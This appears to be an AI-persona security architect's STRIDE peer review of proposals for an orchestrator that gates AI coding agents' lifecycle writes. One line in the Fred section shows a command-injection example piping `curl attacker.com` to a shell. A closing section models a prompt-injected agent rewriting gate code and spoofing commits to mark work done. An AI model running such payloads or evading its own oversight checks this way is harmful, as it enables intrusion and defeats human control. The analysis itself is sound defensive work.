# Security Architecture Cross-Critique

**Persona:** Bruce (Security Architect)
**Phase:** 2 — Peer Review
**Date:** 2026-05-23
**Scope:** scripts/vps/ contour — STRIDE analysis of 7 anonymous peer proposals

---

## Preamble: Research Basis

Exa credits exhausted across all sessions (HTTP 402 confirmed). All security analysis
draws from direct codebase inspection, the 85-finding deep audit report, and the
7 peer research documents. The codebase IS the evidence — this is appropriate for a
threat model of a running production system.

Files with direct security relevance inspected:
- `scripts/vps/callback.py` (1374 LOC) — 19 bare except blocks, identity theater
- `scripts/vps/lifecycle.py` (602 LOC) — CAS write path, `_ALLOWED_WRITERS` frozenset
- `scripts/vps/orchestrator.py` (667 LOC) — bootstrap WT read, `_load_env`
- `.claude/rules/architecture.md` — ADR-023/024 identity contract claims
- Architecture agenda — TELEGRAM_BOT_TOKEN finding, integration landscape
- `ai/audit/deep-audit-report.md` — 85 findings, Scout persona finding #7

---

## Peer Analysis Reviews

### Analysis A (Charity — Operations)

**Agreement:** Partially Agree

**Reasoning from security perspective:**

Charity's analysis is the strongest on detection latency and correctly identifies
that the 5-hour detection window for the bootstrap-flip incident is operationally
catastrophic. From a security standpoint, detection latency is attack dwell time.
An adversary who can trigger `bootstrap_new_specs` to mass-flip specs to `done`
has a 5-hour window before anyone notices. The proposed M-01/ALERT-001 metrics
directly reduce this window to under 5 minutes, which is a meaningful security
improvement even though Charity frames it purely as an ops concern.

The push failure visibility recommendation (M-03, `_push_best_effort` at DEBUG →
WARNING) has a security dimension Charity does not name: a silent push failure means
the lifecycle state on a remote machine can diverge from local HEAD indefinitely.
If an attacker can cause a push failure (network partition, credential revocation),
they effectively prevent multi-machine convergence from detecting their local
lifecycle manipulation.

**Security gaps in this analysis:**

1. **No mention of the audit log as an attack target.** `callback-audit.jsonl` is
   append-only, unencrypted, world-readable (implied by filesystem position in
   `scripts/vps/`). An attacker with local access can pre-populate it with fabricated
   audit entries before a real event occurs. Charity treats it as a forensic source
   without noting it has no integrity guarantee.

2. **Counter metrics can be poisoned.** Charity proposes counter files
   (append-only, one line per increment). These files have no signing or integrity
   check. A compromised process can write arbitrary counter values, triggering or
   suppressing alerts. This is a STRIDE Tampering vector against the proposed
   observability layer itself.

3. **The SQLite DB isolation risk** (Risk 6) is mentioned as "running tests corrupts
   production DB." This is also a privilege escalation vector: any process with
   filesystem access to `orchestrator.db` can directly manipulate `compute_slots`,
   allowing it to acquire more execution slots than permitted. No authentication on
   the DB file.

---

### Analysis B (Neal — Evolutionary Architecture)

**Agreement:** Partially Agree

**Reasoning from security perspective:**

Neal's FF-02 (zombie validator test) and FF-03 (sole writer check) are functionally
security controls, not just fitness functions. Neal correctly identifies that
`spec_lint.py` validating a removed format provides false compliance confidence —
in security terms, this is a broken detection control that produces false negatives.
Any spec created post-ARCH-186 passes the linter trivially, regardless of whether
it has any of the safety properties the linter was designed to check.

The ADR Kill Section proposal is architecturally sound. From a security posture,
superseded-but-not-killed controls are dangerous: they create the illusion that
`DLD-CALLBACK-MARKER` enforcement is active when it has been silently disabled.
An attacker who reads `spec_lint.py` and sees validation logic for a marker that no
longer exists has immediately learned that the enforcement layer is fiction.

**Security gaps:**

1. **FF-03 (sole writer) is an honor-system check.** Neal's test verifies that
   `write_lifecycle()` is called only from allowed modules at static analysis time.
   It does not prevent a runtime bypass: any Python code that opens
   `ai/lifecycle/{spec_id}.yaml` and calls `.write_text()` directly — as
   `migrate_backlog_to_lifecycle.py:224-225` already does — will pass FF-03 because
   that write path bypasses `write_lifecycle()` entirely. Neal's fitness function
   checks function-call discipline, not actual write-path enforcement.

2. **No verification that the pre-commit hook actually fires.** Neal documents the
   dead hook (`core.hooksPath=.git/hooks/` while guard is in `.git-hooks/`) but the
   proposed fitness functions do not include a check that the hook is installed and
   active. A fitness function that can be trivially bypassed by not installing the
   hook is not a fitness function — it is documentation.

---

### Analysis C (Eric — Domain Architecture)

**Agreement:** Agree

**Reasoning from security perspective:**

Eric's bounded context analysis converges on the exact security finding I would
reach via STRIDE: the `by=` identity field in `write_lifecycle` is an honor system
with no enforcement. Eric correctly names it: "a string I wrote myself." From a
security standpoint, this is Spoofing (STRIDE-S) — any caller can impersonate any
writer by passing `by="callback"` or `by="operator"`.

The specific finding that `reconcile_orphans` in `orchestrator.py` calls
`write_lifecycle(by="callback")` is not just a "identity lie" for audit purposes —
it is an active misrepresentation that corrupts the security audit trail. An
operator reviewing `callback-audit.jsonl` for unauthorized writes cannot distinguish
between legitimate callback writes and orchestrator writes disguised as callback.
This degrades non-repudiation (STRIDE-R).

The domain event model Eric proposes (`WorkVerified` → `StatusChanged`) would
improve the security posture by making all status changes go through explicit,
named, auditable events rather than implicit function calls in a 1374-LOC module.

**Security gaps:**

1. **The Anti-Corruption Layer proposal trusts internal callers implicitly.** Eric's
   `resume_pipeline()` public contract would be better than the current
   `_reset_circuit_cli()` direct call, but it still assumes any process with Python
   import access is authorized. In a system where Claude agents run arbitrary code
   in managed project directories, this assumption may not hold.

2. **"Author value object" is still honor-system without cryptographic backing.**
   Eric proposes replacing `str` passed to `by=` with an `Author` value object.
   Unless that object is backed by process identity (OS user, verified credential),
   it is still a sophisticated honor system, not authentication.

---

### Analysis D (Erik — LLM Architect)

**Agreement:** Partially Agree

**Reasoning from security perspective:**

Erik's analysis of the 12-argument positional `_emit_audit` signature is correct
and has a security dimension: audit log corruption through argument transposition.
If a coder-agent accidentally transposes `code_loc` and `code_commits` (both `int`),
the audit log records false metrics that could make a trivially small commit appear
to have large code coverage, potentially triggering a false "done" verdict. This is
an unintentional Tampering vector (STRIDE-T) baked into the function signature.

The `GateResult` dataclass proposal improves security by making gate decisions
auditable and structured rather than implicit in side effects. An auditor can read
a `GateResult` and verify the decision; currently, they must reconstruct the
decision from 12-argument audit calls scattered across the codebase.

**Security gaps:**

1. **`vps-orch.py gate-check SPEC-ID` dry-run tool is an Information Disclosure
   vector.** Erik proposes a dry-run that returns `{"matching_commit": "a3f7b2c",
   "matching_subject": "feat(billing): batch worker (FTR-1053 Task 3)"}`. Any
   process with Python execution can call this tool to learn which commits are
   on `origin/develop`, what files they touch, and whether a spec is close to
   completion. This leaks internal development state. In a single-VPS single-operator
   environment this may be acceptable risk, but the tool should be documented as
   an information disclosure surface.

2. **`signal_completion()` API creates a new trust boundary with no proposed auth.**
   Erik's most interesting proposal is: `signal_completion(spec_id, project_path,
   commit_sha, by="autopilot")`. This inverts the current architecture — the agent
   actively signals completion rather than having callback infer it. The security
   problem: who can call this? Any Python script that can reach the API can claim
   to have completed any spec. The current gate, despite its 28% accuracy problem,
   at least requires the commit to exist on `origin/develop` — an authoritative,
   externally-verifiable source. The signal API removes this external verification.
   A compromised agent could call `signal_completion(spec_id="ARCH-186", ...)` with
   a fabricated commit SHA and mark any spec done without real work.

3. **AGENT_REFERENCE.md as a security target.** Erik proposes a documentation file
   that tells agents "how to manipulate lifecycle state." If an adversarially-prompted
   agent reads this file, it gets a concise guide to the gate's bypass conditions.
   Documentation that enables agents also enables adversarial agents. Defense-in-depth
   means the system must be secure even if the reference document is fully read by
   a malicious actor — which it currently is not (the gate has 28% accuracy).

---

### Analysis E (Dan — DX/Pragmatist)

**Agreement:** Partially Agree

**Reasoning from security perspective:**

Dan's most important security contribution is the explicit acknowledgment of
`TELEGRAM_BOT_TOKEN` committed in plaintext to `scripts/vps/.env` (git-tracked,
not in `.gitignore`). This is not a configuration problem — it is a P0 credential
exposure. The audit report finding #7 (Scout) confirms it. Every contributor to
this repo, every CI runner with access to the repository, and every service that
performs a `git clone` has had access to this token since the commit that introduced
it. Token rotation is mandatory.

Dan's boring-tech argument that "SQLite is already in the codebase, handles concurrent
writes with WAL mode, has transactions" is correct. From a security lens, the
complexity of the current git-as-DB approach (`_atomic_write` with private
`GIT_INDEX_FILE`) is itself an attack surface. Complex cryptographic or
synchronization primitives implemented by hand are historically the source of
security vulnerabilities (Heartbleed, Log4Shell, etc.). The stale-index race
(lifecycle.py:244) is a correctness bug today; the same class of complexity could
harbor a TOCTOU vulnerability.

The `pre-commit framework` proposal (Decision 5) is sound. The current state — hook
exists, hook not installed anywhere — is worse than having no hook, because it
creates the illusion of enforcement where none exists. Security theater is more
dangerous than acknowledged absence.

**Security gaps:**

1. **SQLite migration also has a security dimension Dan misses.** Moving status to
   `orchestrator.db` (Decision 1) concentrates ALL system state in one SQLite file.
   Currently, lifecycle yamls are in git with cryptographic history. SQLite has no
   built-in integrity verification — `UPDATE spec_lifecycle SET status='done'` leaves
   no forensic trail unless the audit log captures it. The transitions table helps,
   but unlike git commits, SQLite rows can be deleted or modified without trace.
   Dan proposes removing the git history of lifecycle writes, which removes the one
   cryptographically verifiable audit trail the system currently has.

2. **`spec_operator.py` removal removes operator accountability.** Dan proposes
   deleting `spec_operator.py` and replacing it with "direct SQLite mutations."
   Direct SQLite mutations (`sqlite3 orchestrator.db "UPDATE ..."`) are unlogged
   and unauthenticated. The current `spec_operator.py`, despite its coupling problems,
   at least writes `by="operator"` to the lifecycle yaml and can potentially be
   extended to log to the audit JSONL. Direct SQL statements bypass any application-level
   logging entirely.

---

### Analysis F (Martin — Data Architecture)

**Agreement:** Partially Agree

**Reasoning from security perspective:**

Martin's analysis of the entity system of record is the most rigorous data-integrity
analysis in the set. The finding that `started_at` is always null (C2) has a security
implication beyond data quality: a spec that transitions `queued → done` without
ever being `in_progress` has no record of when (or whether) an agent actually ran.
A malicious callback call could mark any `queued` spec as `done` without triggering
any pueue task at all, and the lifecycle yaml would reflect a plausible-looking
`done` state with no start time and no `pueue_id`.

Martin's `VALID_TRANSITIONS` enforcement (state machine section) would make this
attack harder, but only if the transition from `queued` directly to `done` is
prohibited — which Martin's proposed state machine does in fact prohibit (the
`queued` transitions set is `{in_progress, blocked, queued}`).

The `blocked_reason` enum proposal (`blocked_code`) is a security improvement:
structured codes enable reliable alerting on `convention_miss` (silent false-blocked
pattern) whereas free-text strings require fragile regex matching that could be
manipulated to evade detection.

**Security gaps:**

1. **`migrate_backlog_to_lifecycle.py` using `Path.write_text()` (C3) is a CAS
   bypass.** Martin correctly identifies this as a data integrity issue. From a
   security standpoint, this is Tampering (STRIDE-T) in the migration tool: anyone
   who can run `migrate_backlog_to_lifecycle.py --commit` can overwrite any
   lifecycle yaml with migration-time values, resetting version counters and erasing
   transition history. This is an unintended privilege escalation tool hidden in a
   "one-shot migration script." The sentinel approach Martin proposes is correct
   but only addresses accidental re-runs, not malicious invocation.

2. **ADR-001 violation (`cost_usd REAL`) is a financial data integrity issue.**
   Martin correctly flags this. From a security standpoint, floating-point cost
   data that feeds into alerts (`sdk_post_result_errors` table drives BUG-188
   detection) can be manipulated by small floating-point precision errors to evade
   alerting thresholds. Using `cost_millicents INTEGER` eliminates this attack surface
   at trivial implementation cost.

3. **`schema_version: 1` in lifecycle YAML does nothing without validation.**
   Martin proposes adding `schema_version` to lifecycle yamls. This is useful for
   migration tracking but creates a false security signal if the field is not
   validated on read. Any attacker who writes a lifecycle yaml directly can set
   `schema_version: 999` and the system will process it normally (YAML parsers
   ignore unknown keys, or the field is read but not validated). Schema version fields
   must be coupled with read-time validation to have security value.

---

### Analysis G (Fred — Devil's Advocate)

**Agreement:** Agree

**Reasoning from security perspective:**

Fred's analysis is the most security-relevant of the seven, even though it is framed
as architectural skepticism rather than threat modeling. The core argument —
"`_ALLOWED_WRITERS = frozenset({everyone})` is equivalent to no access control" —
is exactly what a security architect would say. Fred's Evaporating Cloud correctly
identifies that the "callback is sole writer" principle has been so thoroughly
undermined by practical necessity that it is now purely decorative.

Fred's proposal to delete `updated_by` entirely and use `git log` author as the
true identity source is the correct security approach. Git commits have cryptographic
hash chaining — forging a git author requires either a key compromise or a force-push
(which is detectable). The current `by=` string field provides zero cryptographic
guarantees.

The "zero-rule callback" hypothesis (Part II, Option C) has significant security
implications Fred does not fully develop: separating status determination from pueue
callback reception means an attacker who can send arbitrary pueue completion signals
cannot directly trigger lifecycle writes. The gate daemon polling `origin/develop`
independently removes the pueue-to-lifecycle trust boundary entirely.

The `by="callback"` identity lie in `reconcile_orphans` (lifecycle.py:551) means
the audit trail cannot reliably attribute lifecycle writes. This is a non-repudiation
failure (STRIDE-R) — if callback.py is later found to have made an unauthorized write,
the forensic trail is contaminated by orchestrator writes disguised as callback writes.

**Security gaps:**

1. **The "zero-rule callback" design removes the gate but creates an unguarded
   write path.** Fred's Option C has callback mark `in_progress` on dispatch and
   the separate gate daemon set `done` when it sees the commit on develop. But the
   gate daemon writes lifecycle yamls too — it becomes another writer, another trust
   boundary, another potential impersonation target. Fred does not address how the
   gate daemon's write authority is scoped.

2. **The post-receive hook alternative (Option B) introduces remote code execution
   risk.** A server-side git hook (`post-receive`) that reads commit messages and
   invokes Python functions is an extremely attractive code injection target. If an
   attacker can push a commit whose message contains a malformed spec ID (e.g.,
   `ARCH-999; os.system('curl attacker.com | sh')`), and the hook passes that
   string to a subprocess call without proper escaping, the result is RCE on the
   git server. Fred correctly identifies the elegance of this approach but does not
   threat-model it.

---

## Convergence

All 7 analyses agree on the following, which my security analysis confirms or
strengthens:

| Convergence Point | Security Dimension |
|-------------------|--------------------|
| `bootstrap_new_specs` reads WT backlog.md | Arbitrary status manipulation via working tree |
| `_ALLOWED_WRITERS` is honor-system | Identity spoofing (STRIDE-S) |
| callback.py 1374 LOC god module | Uncontrollable attack surface; large blast radius |
| `_push_best_effort` at DEBUG | Invisible consistency failure = deniable tamper window |
| pre-commit hook not deployed anywhere | Declared security control with zero enforcement |
| scripts/vps/tests/ not in CI | Security regressions go undetected |
| `spec_lint.py` zombie validator | False compliance confidence — worse than no check |

---

## Divergence

The peers diverge on the most consequential architectural decision, which also
has the largest security implications:

| Proposal | Peer | Security Stance |
|----------|------|-----------------|
| Keep git-as-DB (ADR-023), fix implementation | B, C, F, G | Git commits provide cryptographic audit trail; exploitable implementation complexity is fixable |
| Replace git-as-DB with SQLite | E (Dan) | SQLite eliminates implementation complexity bugs; loses cryptographic audit chain |
| Separate gate daemon, reduce callback to 50 LOC | G (Fred) | Most secure: removes pueue-to-lifecycle trust boundary |
| Add structured error taxonomy and tool surface | D (Erik) | Useful for agent debugging; creates new information disclosure surface |
| Signal-based completion API | D (Erik) | Inverts trust model; removes external verification anchor |

My security position on the divergence is in the next section.

---

## Ranking: Top 3 Proposals by Security Leverage

### Rank 1: Fred's "Separate Gate Daemon" (G)

**Leverage:** Highest. Removes the most dangerous trust coupling in the system —
the direct path from "pueue task completes" to "lifecycle status changes." By making
the gate a separate daemon that polls `origin/develop` independently, the blast
radius of a pueue manipulation attack is reduced from "arbitrary status change" to
"delayed detection." An attacker who can send a forged pueue completion signal can
no longer trigger `verify_status_sync` and the attendant lifecycle write.

The `git log origin/develop --grep SPEC-ID` gate has no moving parts to attack:
it queries an authoritative, externally-verifiable, append-only data source (git
history on the remote). No regex convention matching. No `_subject_implements`
bypass. No circuit breaker that can be tripped to suppress legitimate completions.

Combined with keeping git as SoT (not migrating to SQLite), this proposal preserves
the cryptographic audit trail while eliminating the complex CAS implementation that
generates production bugs.

### Rank 2: Martin's State Machine Enforcement (F)

**Leverage:** High. The `VALID_TRANSITIONS` guard with `queued → done` prohibited
closes a significant attack vector: a malicious or buggy callback cannot mark a
spec `done` without first recording an `in_progress` state with `pueue_id`. This
means any `done` lifecycle yaml must have a corresponding pueue task record.
Cross-referencing `done` yamls against `task_log` becomes a viable integrity check.

The `blocked_code` enum proposal enables machine-readable classification of all
blocked states, making it possible to alert specifically on `convention_miss` (the
pattern that caused systematic false-blocking). This is a security monitoring
improvement: the difference between "spec blocked, human reads log" and "spec
blocked with code=convention_miss, alert fires with reason."

### Rank 3: Dan's Token Rotation + Boring Tech (E)

**Leverage:** High for immediate risk, medium for long-term. `TELEGRAM_BOT_TOKEN`
in plaintext in git history is the only current confirmed credential exposure.
This is P0 regardless of all architectural debates. Rotate the token, move to Nexus,
remove from git-tracked `.env` file.

Dan's point that "boring is more secure" — SQLite single-writer process is simpler
to reason about than 8-subprocess CAS plumbing — is correct for implementation
security. The counter-argument (SQLite loses cryptographic audit trail) is addressed
by keeping the JSONL audit log alongside SQLite. The transition history in
`spec_transitions` is SQLite-auditable; the git plumbing audit trail can be
supplemental for higher-assurance scenarios.

---

## Security-Specific Analysis

### Proposals That INCREASE Attack Surface

**1. Erik's `signal_completion()` API (D)**

This is the most dangerous proposal in the set from a security standpoint. Current
gate: verify work exists on `origin/develop` (externally verifiable). Proposed gate:
accept signal from agent declaring work done with a commit SHA. This moves the trust
anchor from "git history" (tamper-evident, remote, multi-party) to "agent assertion"
(local, honor-system, controllable by the agent itself).

Attack scenario: a compromised autopilot agent calls:
```
signal_completion(spec_id="ARCH-999", commit_sha="0000000", by="autopilot")
```
If this API exists and trusts the agent's assertion, any spec can be marked done
with zero real work. The current `_subject_implements` gate, despite its 28%
accuracy problem, at least requires that SOMETHING exists on `origin/develop`.
The signal API removes even that requirement.

**2. Dan's `spec_operator.py` removal → direct SQLite mutations (E)**

Current: `spec_operator.py` writes `by="operator"` to lifecycle yaml (honor-system
but at least logged). Proposed: `sqlite3 orchestrator.db "UPDATE ..."` at the shell.
The SQLite mutation leaves no application-level audit trail. If the orchestrator is
later compromised, an attacker can run direct SQLite mutations to manipulate spec
status and the forensic evidence is absent.

**3. Any proposal that disables the circuit breaker without a replacement**

Fred (G) proposes simplifying the circuit breaker to a counter+alert rather than
a full pueue pause. The security dimension: the circuit breaker is the only existing
automated response to a mass-manipulation event (>3 demotions in 10 minutes). If
an attacker triggers mass-demotions to flood the system with false-blocked specs,
the circuit breaker currently stops new autopilot dispatches, limiting damage spread.
Removing the automated pause without a replacement response mechanism leaves the
system without defense-in-depth at the circuit layer.

### Trust Assumptions That Don't Hold

**Assumption 1: `by=` field provides meaningful identity.**

No peer proposes cryptographic identity. Fred correctly identifies `git author` as
the only verifiable identity but doesn't complete the argument: the pre-commit hook
that would enforce this is dead everywhere. Until the hook is installed and active,
ALL identity claims in `updated_by` fields are unverified assertions.

**Assumption 2: The orchestrator runs in an isolated environment.**

The orchestrator has access to `orchestrator.db`, all lifecycle yamls, all
`scripts/vps/` Python files, the pueue socket, and all managed project directories.
No peer discusses what happens if a managed project's Claude agent is adversarially
prompted and gains shell access. The managed projects run Claude agents with
`workspace-write` sandbox. If any agent can write to `scripts/vps/callback.py`, it
can modify the gate logic itself. The attack surface is `scripts/vps/` being in the
same filesystem as managed project directories that AI agents write to.

**Assumption 3: The audit JSONL is a reliable forensic source.**

Multiple peers cite `callback-audit.jsonl` as the primary incident investigation
tool. No peer notes that this file has no integrity protection: no signatures, no
hash chaining, no append-only filesystem enforcement. It is an ordinary file on an
ordinary filesystem. Any process with write access to `scripts/vps/` can insert,
modify, or delete audit entries. Using it as forensic evidence in a security
investigation requires trusting filesystem permissions — which is insufficient for
non-repudiation (STRIDE-R).

### Peers Solving Symptoms While Leaving the Exploit Path Open

**A (Charity):** Proposes detecting mass-bootstrap events (ALERT-001). This detects
the SYMPTOM (15 specs flipped to done) but the exploit path remains: `bootstrap_new_specs`
still reads WT backlog.md. An attacker who can edit `ai/backlog.md` in the working
tree triggers the same 15-flip effect on the next orchestrator cycle. The alert
fires 5 minutes later, after the damage is done. Fix the root cause (remove WT read),
not just the detection.

**D (Erik):** Proposes `GateResult` dataclass with `gate_ran: bool`. The intent is
debuggability. The security hole: if `gate_ran=False` (circuit breaker open), no
lifecycle write occurs — correct. But if the gate_ran=True and `write_succeeded=False`
(CAS race lost), the audit record still shows the DECISION was "done" even though
the write didn't happen. A false audit record of a done decision for a spec that was
NOT actually written to done is worse than no audit record — it creates a divergence
between audit evidence and actual state that looks like a completed cover-up.

**B (Neal):** FF-03 sole-writer check catches unauthorized `write_lifecycle()` calls
in Python files at test time. The exploit path it misses: `Path.write_text()` on
lifecycle files (already present in `migrate_backlog_to_lifecycle.py:224-225`). Neal's
test explicitly excludes this file. Any new tool or script that directly writes YAML
files bypasses FF-03 entirely. The test has a documented known bypass.

---

## Your Addition: The Missing Threat Model Element

**All 7 peers missed: the AI agent as a threat actor.**

This system is infrastructure that governs AI agents. Every peer analyzes threats
from human actors or software bugs. No peer threat-models the AI agents themselves.

This is the most novel and most dangerous attack surface in this architecture.

Consider the threat actor: an autopilot agent running in a managed project (e.g.,
`awardybot`) that has been adversarially prompted via a spec it processes. The spec
instructs the agent to "fix the billing module." Inside `ai/features/FTR-1053.md`,
the `## Allowed Files` section lists:
```
- src/billing/models.py
- src/billing/services.py
```

The agent's task is to modify billing code. But the agent has access to the entire
project filesystem. If it can read `scripts/vps/callback.py` (which lives in the DLD
project, accessible via the filesystem), it can learn the gate logic. If it can write
to the DLD project directory (depending on sandbox configuration), it can modify the
gate.

The "allowed files" enforcement in callback.py (`_parse_allowed_files`) is designed
to limit WHAT the agent writes, not WHERE the agent can write from. There is no check
that the agent's commits are limited to the managed project's `Allowed Files`.

**STRIDE applied to the AI agent threat actor:**

| Threat | How | Current Defense |
|--------|-----|-----------------|
| Spoofing | Agent writes commit with `feat(FTR-1053):` subject claiming to implement spec | `_subject_implements` (28% accuracy for DLD convention) |
| Tampering | Agent modifies `scripts/vps/callback.py` directly, changing gate logic | NONE — no file restriction on agent writes outside managed project |
| Repudiation | Agent writes `by="callback"` to lifecycle yaml directly | `_ALLOWED_WRITERS` honor system, not enforced |
| Information Disclosure | Agent reads `AGENT_REFERENCE.md` to learn bypass conditions | No access controls on documentation |
| Denial of Service | Agent creates 100 spurious commits matching `SPEC-ID` regex, triggering gate exhaustion | No rate limiting on git log queries |
| Elevation of Privilege | Agent modifies `orchestrator.py` to add itself to `_ALLOWED_WRITERS`, then calls `write_lifecycle` | No separation between agent workspace and orchestrator codebase |

**The architectural defense-in-depth that would address this:**

1. The orchestrator's `scripts/vps/` directory must be on a separate filesystem
   from managed project directories that agents write to.

2. Agent commits to managed projects must be verified against the project's `Allowed Files`
   BEFORE the pueue callback runs — not just checked by the gate after the fact.
   Currently the gate is the only enforcement; if it fails (28% accuracy), there is
   no backup.

3. The identity claim `by="callback"` must be replaced by OS-level process identity
   (the unix user running callback) rather than an honor-system string. If callback
   runs as user `callback-svc` and orchestrator runs as `orchestrator-svc`, the `by=`
   field can be derived from `os.getlogin()` and cross-checked against
   `lifecycle._ALLOWED_WRITERS` with process-level granularity.

This is the threat that the entire peer group missed because they all focused on
human operators and software bugs. In a system where the primary actors are LLM
agents with code-writing capabilities, the agent IS the threat model.

---

## Revised Position

**Revised Verdict:** Changed from Phase 1.

In Phase 1, I recommended defense-in-depth focused on the git-as-DB complexity as
the primary attack surface. After reviewing the peer analyses, I strengthen this
recommendation in one direction and reverse it in another:

**Strengthen:** The credential exposure (`TELEGRAM_BOT_TOKEN`) is P0 regardless of
all other architectural debates. Fred's separation of gate daemon from pueue callback
is the highest-leverage structural security improvement — it removes the most
consequential trust coupling in the system.

**Reverse on SQLite migration:** Dan's proposal to replace git-as-DB with SQLite is
architecturally simpler and operationally correct, but from a security standpoint
it trades a complex-but-verifiable audit trail for a simple-but-mutable one. The
right path is Fred's simplification of the CAS implementation (use `git add + git commit`
instead of private `GIT_INDEX_FILE` dance) while keeping git as the SoT. This
preserves the cryptographic audit trail at lower implementation complexity.

**New position from peer analysis:** The AI agent as threat actor is the
architectural security requirement that must drive the decomposition design, not
just human operator threats. The callback/lifecycle contour must be secured against
an adversarially-prompted agent that has learned the gate logic and has write access
to adjacent filesystems.

---

## Final Security Recommendation

**Immediate (P0):**

1. Rotate `TELEGRAM_BOT_TOKEN` today. Remove from `scripts/vps/.env`, move to Nexus.
   This is the only confirmed credential exposure and every hour of delay extends
   the exposure window.

2. Move `scripts/vps/` to a filesystem path inaccessible to agent sandbox writes.
   The orchestrator infrastructure must not share a filesystem namespace with managed
   project directories where agents operate.

**Structural (P1):**

3. Implement Fred's gate separation: callback.py shrinks to 50-LOC slot-release +
   dispatcher; gate.py polls `origin/develop --grep SPEC-ID` independently. This
   removes the pueue-to-lifecycle trust coupling.

4. Replace `by=` honor-system with OS process identity (`os.getlogin()` or
   `pwd.getpwuid(os.getuid()).pw_name`). The `_ALLOWED_WRITERS` check becomes
   a process-identity whitelist, not a string-argument whitelist.

5. Implement Martin's `VALID_TRANSITIONS` guard. The `queued → done` direct path
   must be prohibited — it masks attacks that mark specs done without any agent
   execution.

6. Implement the circuit breaker as an alert+pause (current behavior) but add a
   MINIMUM PAUSE of 30 seconds even if reset is requested. This prevents an attacker
   from triggering and immediately resetting the circuit breaker to suppress alerts.

**Hardening (P2):**

7. Sign `callback-audit.jsonl` entries with HMAC using a key stored outside the
   `scripts/vps/` filesystem. This makes the audit log tamper-evident as a forensic
   source.

8. Implement Neal's FF-03 sole-writer check to also detect `Path.write_text()` calls
   on lifecycle paths — not just `write_lifecycle()` call discipline.

9. Rate-limit the `git log origin/develop --grep` call in the gate daemon to prevent
   DoS via spec ID flooding.

---

## References

- STRIDE threat modeling framework (Microsoft SDL)
- OWASP Top 10 2025 — A2: Cryptographic Failures, A7: Identification and Authentication Failures
- `scripts/vps/lifecycle.py:46-51` — `_ALLOWED_WRITERS` honor system
- `scripts/vps/lifecycle.py:551` — `by="callback"` identity misattribution
- `scripts/vps/migrate_backlog_to_lifecycle.py:224-225` — `Path.write_text()` CAS bypass
- `scripts/vps/callback.py:699-711` — `_subject_implements` 28% accuracy
- Architecture agenda — TELEGRAM_BOT_TOKEN plaintext in git-tracked .env
- Deep audit report — Scout finding #7 (credential exposure)
- Architecture agenda — agent sandbox model (workspace-write)
- ADR-023, ADR-024 — identity enforcement claims vs actual enforcement
